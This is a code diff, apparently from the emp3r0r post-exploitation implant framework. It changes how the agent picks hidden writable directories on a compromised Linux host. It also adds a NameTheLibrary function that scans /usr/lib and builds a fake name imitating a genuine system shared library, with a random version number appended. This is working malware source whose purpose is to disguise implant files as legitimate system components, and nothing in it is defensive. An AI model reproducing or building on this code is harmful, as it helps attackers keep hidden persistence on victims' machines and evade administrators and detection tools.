@@ -15,6 +15,9 @@ import (
 
 var RuntimeConfig = &emp3r0r_data.Config{}
 
+// Remember writable locations for later use
+var WritableLocations = []string{}
+
 func ApplyRuntimeConfig() (err error) {
 	readJsonData, err := util.ExtractData()
 	if err != nil {
@@ -89,6 +92,7 @@ func GetRandomWritablePath() (string, error) {
 	if err == nil {
 		appendWritablePaths(homeDir)
 	}
+	WritableLocations = paths // remember writable locations
 
 	// if emp3r0r's agent root already exists?
 	for _, path := range paths {
@@ -99,7 +103,7 @@ func GetRandomWritablePath() (string, error) {
 	}
 
 	just_get_one := func() string {
-		rand_common_path := emp3r0r_data.CommonDirs[util.RandInt(0, len(emp3r0r_data.CommonDirs))]
+		rand_common_path := emp3r0r_data.CommonFilenames[util.RandInt(0, len(emp3r0r_data.CommonFilenames))]
 		suffixes := []string{"_tmp", "_temp", "_backup", "_copy"}
 		rand_suffix := suffixes[util.RandInt(0, len(suffixes))]
 		if util.IsExist(rand_common_path) {
@@ -130,4 +134,46 @@ func GetRandomWritablePath() (string, error) {
 		rand_path += "/"
 	}
 	return rand_path, nil
+}
+
+// NameTheLibrary generates a random name for a shared library
+func NameTheLibrary() string {
+	// Define the directory to search for .so files
+	searchDir := "/usr/lib"
+
+	// Slice to hold found .so files
+	var soFiles []string
+
+	// Walk the directory to find .so files
+	err := filepath.Walk(searchDir, func(path string, info os.FileInfo, err error) error {
+		if err != nil {
+			return err
+		}
+		if strings.HasSuffix(info.Name(), ".so") {
+			soFiles = append(soFiles, path)
+		}
+		return nil
+	})
+
+	if err != nil {
+		log.Println("Error scanning for .so files:", err)
+		return ""
+	}
+
+	// Check if any .so files were found
+	if len(soFiles) == 0 {
+		log.Println("No .so files found")
+		return ""
+	}
+
+	// Get a random .so file
+	randSoFile := soFiles[util.RandInt(0, len(soFiles))]
+
+	// Generate a random version number
+	version := fmt.Sprintf("%d.%d", util.RandInt(0, 10), util.RandInt(0, 10))
+
+	// Construct the proposed name
+	proposedName := fmt.Sprintf("%s.%s", filepath.Base(randSoFile), version)
+
+	return proposedName
 }
